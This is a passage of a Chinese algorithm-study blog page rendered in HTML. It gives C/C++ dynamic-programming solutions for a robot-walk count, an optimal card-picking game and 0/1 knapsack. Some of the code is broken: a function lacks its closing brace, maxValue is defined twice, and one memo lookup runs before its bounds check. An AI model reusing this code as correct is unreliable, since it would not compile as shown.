class="hljs-number">0</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cur == <span class="hljs-number">1</span>) &#123;<br>        ans = process2(<span class="hljs-number">2</span>, rest - <span class="hljs-number">1</span>, aim, N, dp);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cur == N) &#123;<br>        ans = process2(N - <span class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>, aim, N, dp);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        ans = process2(cur - <span class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>, aim, N, dp) + process2(cur + <span class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>, aim, N, dp);<br>    &#125;<br>    dp[cur][rest] = ans; <span class="hljs-comment">//把次调用的数组填到表里</span><br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">ways2</span><span class="hljs-params">(<span class="hljs-type">int</span> N, <span class="hljs-type">int</span> start, <span class="hljs-type">int</span> aim, <span class="hljs-type">int</span> K)</span> &#123;<br>    <span class="hljs-keyword">if</span> (N &lt; <span class="hljs-number">2</span> || start &lt; <span class="hljs-number">1</span> || start &gt; N || aim &lt; <span class="hljs-number">1</span> || aim &gt; N || K &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; dp(N + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(K + <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>)); <span class="hljs-comment">//0-N和0-K，记得设定为-1</span><br>    <span class="hljs-keyword">return</span> process2(start, K, aim, N, dp);<br>&#125;<br><br><br><br><br><span class="hljs-comment">//画表分析过程中的依赖关系自己填表</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ways3</span><span class="hljs-params">(<span class="hljs-type">int</span> N, <span class="hljs-type">int</span> start, <span class="hljs-type">int</span> aim, <span class="hljs-type">int</span> K)</span> &#123;<br>    <span class="hljs-keyword">if</span> (N &lt; <span class="hljs-number">2</span> || start &lt; <span class="hljs-number">1</span> || start &gt; N || aim &lt; <span class="hljs-number">1</span> || aim &gt; N || K &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; dp(N + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(K + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>));<br>    dp[aim][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> rest = <span class="hljs-number">1</span>; rest &lt;= K; rest++) &#123;<br>        dp[<span class="hljs-number">1</span>][rest] = dp[<span class="hljs-number">2</span>][rest - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cur = <span class="hljs-number">2</span>; cur &lt; N; cur++) &#123;<br>            dp[cur][rest] = dp[cur - <span class="hljs-number">1</span>][rest - <span class="hljs-number">1</span>] + dp[cur + <span class="hljs-number">1</span>][rest - <span class="hljs-number">1</span>];<br>        &#125;<br>        dp[N][rest] = dp[N - <span class="hljs-number">1</span>][rest - <span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[start][K];<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="聪明人玩扑克"><a href="#聪明人玩扑克" class="headerlink" title="聪明人玩扑克"></a>聪明人玩扑克</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//两个聪明人玩抽牌，每次只能抽最左和最右的一张牌，返回胜这两人中最大的分数</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-comment">//先手获得的最好分数返回</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> L, <span class="hljs-type">int</span> R)</span> &#123;<br>    <span class="hljs-keyword">if</span> (L == R) &#123;<br>        <span class="hljs-keyword">return</span> arr[L];<br>    &#125;<br>    <span class="hljs-type">int</span> p1 = arr[L] + g1(arr, L + <span class="hljs-number">1</span>, R);  <span class="hljs-comment">//写p1p2代表可能性</span><br>    <span class="hljs-type">int</span> p2 = arr[R] + g1(arr, L, R - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> max(p1, p2);<br>&#125;<br><span class="hljs-comment">//后手获得的最好分数返回</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">g1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> L, <span class="hljs-type">int</span> R)</span> &#123;<br>    <span class="hljs-keyword">if</span> (L == R) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> p1 = f1(arr, L + <span class="hljs-number">1</span>, R); <span class="hljs-comment">// 对手拿走了L位置的数</span><br>    <span class="hljs-type">int</span> p2 = f1(arr, L, R - <span class="hljs-number">1</span>); <span class="hljs-comment">// 对手拿走了R位置的数</span><br>    <span class="hljs-keyword">return</span> min(p1, p2);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">win1</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> first = f1(arr, <span class="hljs-number">0</span>, arr.size() - <span class="hljs-number">1</span>);<br>    <span class="hljs-type">int</span> second = g1(arr, <span class="hljs-number">0</span>, arr.size() - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> max(first, second);<br>&#125;<br><br><br><br><br><br><span class="hljs-comment">//傻缓存法</span><br><span class="hljs-comment">// 先手获得的最好分数</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> L, <span class="hljs-type">int</span> R, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; fmap, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; gmap)</span> &#123;<br>    <span class="hljs-keyword">if</span> (fmap[L][R] != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> fmap[L][R];<br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (L == R) &#123;<br>        ans = arr[L];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">int</span> p1 = arr[L] + g2(arr, L + <span class="hljs-number">1</span>, R, fmap, gmap);<br>        <span class="hljs-type">int</span> p2 = arr[R] + g2(arr, L, R - <span class="hljs-number">1</span>, fmap, gmap);<br>        ans = max(p1, p2);<br>    &#125;<br>    fmap[L][R] = ans;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-comment">// 后手获得的最好分数</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">g2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> L, <span class="hljs-type">int</span> R, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; fmap, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; gmap)</span> &#123;<br>    <span class="hljs-keyword">if</span> (gmap[L][R] != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> gmap[L][R];<br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (L != R) &#123;<br>        <span class="hljs-type">int</span> p1 = f2(arr, L + <span class="hljs-number">1</span>, R, fmap, gmap); <span class="hljs-comment">// 对手拿走了L位置的数</span><br>        <span class="hljs-type">int</span> p2 = f2(arr, L, R - <span class="hljs-number">1</span>, fmap, gmap); <span class="hljs-comment">// 对手拿走了R位置的数</span><br>        ans = min(p1, p2);<br>    &#125;<br>    gmap[L][R] = ans;<br>    <span class="hljs-keyword">return</span> ans;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">win2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> N = arr.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; fmap(N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(N, <span class="hljs-number">-1</span>));<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; gmap(N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(N, <span class="hljs-number">-1</span>));<br>    <span class="hljs-type">int</span> first = f2(arr, <span class="hljs-number">0</span>, N - <span class="hljs-number">1</span>, fmap, gmap);<br>    <span class="hljs-type">int</span> second = g2(arr, <span class="hljs-number">0</span>, N - <span class="hljs-number">1</span>, fmap, gmap);<br>    <span class="hljs-keyword">return</span> max(first, second);<br>&#125;<br><br><br><br>    <br><span class="hljs-type">int</span> <span class="hljs-title function_">win3</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> N = arr.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; fmap(N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(N, <span class="hljs-number">0</span>));<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; gmap(N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(N, <span class="hljs-number">0</span>));<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++) &#123;<br>        fmap[i][i] = arr[i];<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> startCol = <span class="hljs-number">1</span>; startCol &lt; N; startCol++) &#123;<br>        <span class="hljs-type">int</span> L = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> R = startCol;<br>        <span class="hljs-keyword">while</span> (R &lt; N) &#123;<br>            fmap[L][R] = max(arr[L] + gmap[L + <span class="hljs-number">1</span>][R], arr[R] + gmap[L][R - <span class="hljs-number">1</span>]);<br>            gmap[L][R] = min(fmap[L + <span class="hljs-number">1</span>][R], fmap[L][R - <span class="hljs-number">1</span>]);<br>            L++;<br>            R++;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> max(fmap[<span class="hljs-number">0</span>][N - <span class="hljs-number">1</span>], gmap[<span class="hljs-number">0</span>][N - <span class="hljs-number">1</span>]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; arr = &#123;<span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>&#125;;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;win1: &quot;</span> &lt;&lt; win1(arr) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;win2: &quot;</span> &lt;&lt; win2(arr) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;win3: &quot;</span> &lt;&lt; win3(arr) &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="背包"><a href="#背包" class="headerlink" title="背包"></a>背包</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 所有的货，重量和价值，都在w和v数组里， 为了方便，其中没有负数 bag背包容量，不能超过这个载重 返回：不超重的情况下，能够得到的最大价值</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 尝试函数</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; w, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; v, <span class="hljs-type">int</span> index, <span class="hljs-type">int</span> rest)</span> &#123;<br>    <span class="hljs-keyword">if</span> (rest &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (index == w.size()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> p1 = process(w, v, index + <span class="hljs-number">1</span>, rest);<br>    <span class="hljs-type">int</span> p2 = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> next = process(w, v, index + <span class="hljs-number">1</span>, rest - w[index]);  <span class="hljs-comment">//这样写不好，因为傻缓存法会越界，一开始就过滤掉负数的可能</span><br>    <span class="hljs-keyword">if</span> (next != <span class="hljs-number">-1</span>) &#123;  <br>        p2 = v[index] + next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> max(p1, p2);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">maxValue</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; w, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; v, <span class="hljs-type">int</span> bag)</span> &#123;<br>    <span class="hljs-keyword">if</span> (w.empty() || v.empty() || w.size() != v.size()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> process(w, v, <span class="hljs-number">0</span>, bag);<br>&#125;<br><br><br><br><span class="hljs-comment">// 傻缓存</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; w, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; v, <span class="hljs-type">int</span> index, <span class="hljs-type">int</span> rest, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; dp)</span> &#123;<br>    <span class="hljs-keyword">if</span> (dp[index][rest] != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> dp[index][rest];<br>    &#125;<br>    <span class="hljs-keyword">if</span> (rest &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (index == w.size()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 不选当前物品</span><br>    <span class="hljs-type">int</span> p1 = process(w, v, index + <span class="hljs-number">1</span>, rest, dp);<br><span class="hljs-type">int</span> p2 = <span class="hljs-number">-1</span> ; <br>    <span class="hljs-comment">// 选择当前物品</span><br>  <span class="hljs-keyword">if</span> (rest &gt;= w[index]) &#123; <span class="hljs-comment">//注意这里，因为参数作为数组下标一开始就不要让它越界</span><br>        p2 = v[index] + process(w, v, index + <span class="hljs-number">1</span>, rest - w[index], dp);<br>&#125;<br>    dp[index][rest] = max(p1, p2);<br>    <span class="hljs-keyword">return</span> dp[index][rest];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">maxValue</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; w, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; v, <span class="hljs-type">int</span> bag)</span> &#123;<br>    <span class="hljs-keyword">if</span> (w.empty() || v.empty() || w.size() != v.size()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// 用 -1 初始化 dp 数组</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; dp(w.size() + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(bag + <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>));<br><br>    <span class="hljs-comment">// 调用 process 函数计算最大价值</span><br>    <span class="hljs-keyword">return</span> process(w, v, <span class="hljs-number">0</span>, bag, dp);<br>&#125; <br><br><br><br><br><br><span class="hljs-comment">// 动态规划解法</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; w, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; v, <span class="hljs-type">int</span> bag)</span> &#123;<br>    <span class="hljs-keyword">if</span> (w.empty() || v.empty() || w.size() != v.size()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> N = w.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; dp(N + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(bag + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>));<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> index = N - <span class="hljs-number">1</span>; index &gt;= <span class="hljs-number">0</span>; index--) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> rest = <span class="hljs-number">0</span>; rest &lt;= bag; rest++) &#123;<br>            <span class="hljs-type">int</span> p1 = dp[index + <span class="hljs-number">1</span>][rest];<br>            <span class="hljs-type">int</span> p2 = <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> next = (rest - w[index] &lt; <span class="hljs-number">0</span>) ? <span class="hljs-number">-1</span> : dp[index + <span class="hljs-number">1</span>][rest - w[index]];<br>            <span class="hljs-keyword">if</span> (next != <span class="hljs-number">-1</span>) &#123;<br>                p2 = v[index] + next;<br>            &#125;<br>            dp[index][rest] = max(p1, p2);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[<span class="hljs-number">0</span>][bag];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; weights = &#123;<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>&#125;;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; values = &#123;<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">19</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-type">int</span> bag = <span class="hljs-number">15</span>;<br><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Max Value (Recursive): &quot;</span> &lt;&lt; maxValue(weights, values, bag) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Max Value (DP): &quot;</span> &lt;&lt; dp(weights, values, bag) &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="数字转成字母的所有方法"><a href="#数字转成字母的所有方法" class="headerlink" title="数字转成字母的所有方法"></a>数字转成字母的所有方法</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 